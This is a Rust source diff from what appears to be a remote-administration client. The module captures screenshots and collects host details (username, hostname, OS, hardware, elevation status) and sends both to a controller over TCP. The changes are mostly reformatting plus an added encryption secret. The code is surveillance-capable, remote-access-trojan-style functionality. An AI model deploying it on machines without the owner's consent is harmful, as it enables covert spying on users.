@@ -1,25 +1,25 @@
 use std::net::TcpStream;
-use screenshots::{image, Screen};
+use screenshots::{ image, Screen };
 use std::io::Cursor;
 
-use sysinfo::{System, Disks};
+use sysinfo::{ System, Disks };
 
-use winapi::shared::winerror::{S_OK, DXGI_ERROR_NOT_FOUND};
-use winapi::shared::dxgi::{CreateDXGIFactory, IDXGIFactory};
+use winapi::shared::winerror::{ S_OK, DXGI_ERROR_NOT_FOUND };
+use winapi::shared::dxgi::{ CreateDXGIFactory, IDXGIFactory };
 use winapi::shared::dxgi::IDXGIAdapter;
 use winapi::Interface;
 
 use winapi::um::winuser::EnumDisplayMonitors;
-use winapi::shared::windef::{HMONITOR, HDC, RECT};
-use winapi::shared::minwindef::{BOOL, LPARAM};
+use winapi::shared::windef::{ HMONITOR, HDC, RECT };
+use winapi::shared::minwindef::{ BOOL, LPARAM };
 use std::ptr;
 
 use crate::service::install::is_elevated;
 
 use common::buffers::write_buffer;
-use common::commands::{ReceiveClient, Command};
+use common::commands::{ ClientInfo, Command };
 
-pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
+pub fn take_screenshot(write_stream: &mut TcpStream, display: i32, secret: &Option<Vec<u8>>) {
     let screens = Screen::all().unwrap();
 
     let screen = screens[display as usize];
@@ -32,19 +32,26 @@ pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
         .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
         .expect("Couldn't write image to bytes.");
 
-    write_buffer(write_stream, Command::ScreenshotResult(bytes));
+    write_buffer(write_stream, Command::ScreenshotResult(bytes), secret);
 }
 
-pub fn client_info(write_stream: &mut TcpStream) {
+pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
     let mut s = System::new_all();
 
     let mut storage = Vec::new();
 
     let disks = Disks::new_with_refreshed_list();
     for disk in disks.list() {
-        storage.push(format!("{} {} {}", disk.name().to_string_lossy(), convert_bytes(disk.available_space() as f64), disk.kind()));
+        storage.push(
+            format!(
+                "{} {} {}",
+                disk.name().to_string_lossy(),
+                convert_bytes(disk.available_space() as f64),
+                disk.kind()
+            )
+        );
     }
-    
+
     let mut gpus = Vec::new();
 
     unsafe {
@@ -81,14 +88,14 @@ pub fn client_info(write_stream: &mut TcpStream) {
             ptr::null_mut(),
             ptr::null_mut(),
             Some(monitor_enum_proc),
-            &mut display_count as *mut _ as LPARAM,
+            &mut display_count as *mut _ as LPARAM
         );
     }
 
     std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
     s.refresh_cpu();
 
-    let client_data: ReceiveClient = ReceiveClient {
+    let client_data = ClientInfo {
         username: std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string()),
         hostname: System::host_name().unwrap().to_string(),
         os: format!("{} {}", System::name().unwrap(), System::os_version().unwrap()),
@@ -100,10 +107,10 @@ pub fn client_info(write_stream: &mut TcpStream) {
         is_elevated: is_elevated(),
     };
 
-    write_buffer(write_stream, Command::Client(client_data));
+    write_buffer(write_stream, Command::Client(client_data), secret);
 }
 
-const SUFFIX: [& str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
+const SUFFIX: [&str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
 
 pub fn convert_bytes<T: Into<f64>>(size: T) -> String {
     let size = size.into();
@@ -112,9 +119,9 @@ pub fn convert_bytes<T: Into<f64>>(size: T) -> String {
         return "0 B".to_string();
     }
 
-    let base = size.log10() / 1024_f64.log10();
+    let base = size.log10() / (1024_f64).log10();
 
-    let mut result = ((1024_f64.powf(base - base.floor()) * 10.0).round() / 10.0).to_string();
+    let mut result = (((1024_f64).powf(base - base.floor()) * 10.0).round() / 10.0).to_string();
 
     result.push(' ');
     result.push_str(SUFFIX[base.floor() as usize]);
@@ -126,7 +133,7 @@ unsafe extern "system" fn monitor_enum_proc(
     _h_monitor: HMONITOR,
     _hdc_monitor: HDC,
     _lprc_monitor: *mut RECT,
-    lparam: LPARAM,
+    lparam: LPARAM
 ) -> BOOL {
     let count = &mut *(lparam as *mut usize);
     *count += 1;
